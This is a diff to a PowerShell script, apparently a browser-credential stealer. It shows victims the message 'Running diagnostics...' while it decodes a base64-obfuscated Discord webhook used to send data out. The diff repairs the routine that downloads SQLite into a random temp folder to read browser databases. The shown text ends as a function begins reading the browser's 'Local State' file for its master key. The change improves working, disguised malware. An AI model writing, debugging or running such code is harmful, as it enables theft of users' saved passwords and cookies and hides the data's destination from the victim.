@@ -91,25 +91,38 @@ if (-not (Test-Admin)) {
 # ============ GRABBER (runs first) ============
 Write-Host "Running diagnostics..." -ForegroundColor Cyan
 
-# Your new webhook – base64 encoded
+# Your webhook – base64 encoded
 $webhook = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzOTcyMTQzMjk0OTQ2MTAxMi9LOWg1amwtd25QOUtGT0MxeUJLZTZfZ2ZuNkhwdlphZHZJbEFGQnJELUtXR1pIcHFwVnh2RWxWQ2lXeWpVMmRlOElfcA=='))
 
-# Load SQLite with native dependencies
+# ---- FIXED SQLITE LOADER ----
 $tmp = "$env:TEMP\sqlite_$([System.IO.Path]::GetRandomFileName() -replace '\..*')"
 New-Item -ItemType Directory -Path $tmp -Force | Out-Null
 Push-Location $tmp
+
 try {
-    Invoke-WebRequest -Uri "https://github.com/ericsink/SQLitePCL.raw/raw/master/bin/System.Data.SQLite.dll" -OutFile "$tmp\SQLite.Interop.dll" -UseBasicParsing -ErrorAction Stop
+    # Download official SQLite binaries (includes both managed and native DLLs)
+    $sqliteUrl = "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-bundle-Win32-2022-1.0.118.0.zip"
+    Invoke-WebRequest -Uri $sqliteUrl -OutFile "$tmp\sqlite.zip" -UseBasicParsing -ErrorAction Stop
     Expand-Archive -Path "$tmp\sqlite.zip" -DestinationPath $tmp -Force -ErrorAction Stop
-    $arch = if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { 'x64' } elseif ($env:PROCESSOR_ARCHITECTURE -eq 'ARM64') { 'arm64' } else { 'x86' }
-    Copy-Item "$tmp\lib\net48\System.Data.SQLite.dll" "$tmp\" -Force
-    Copy-Item "$tmp\runtimes\win-$arch\native\SQLite.Interop.dll" "$tmp\" -Force
+
+    # Copy the correct architecture DLLs
+    if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
+        Copy-Item "$tmp\System.Data.SQLite.x64.dll" "$tmp\System.Data.SQLite.dll" -Force
+        Copy-Item "$tmp\x64\SQLite.Interop.dll" "$tmp\SQLite.Interop.dll" -Force
+    } else {
+        Copy-Item "$tmp\System.Data.SQLite.x86.dll" "$tmp\System.Data.SQLite.dll" -Force
+        Copy-Item "$tmp\x86\SQLite.Interop.dll" "$tmp\SQLite.Interop.dll" -Force
+    }
+
+    # Load the assembly – both DLLs are now in the same folder
     [System.Reflection.Assembly]::LoadFile("$tmp\System.Data.SQLite.dll") | Out-Null
     $sqliteOK = $true
+    Write-Host "SQLite loaded successfully." -ForegroundColor Green
 } catch {
-    Write-Host "SQLite load failed – skipping browser data." -ForegroundColor Yellow
+    Write-Host "SQLite load failed: $_" -ForegroundColor Yellow
     $sqliteOK = $false
 }
+# ---------------------------------------------
 
 function Get-MasterKey($p) {
     $ls = Join-Path $p "Local State"
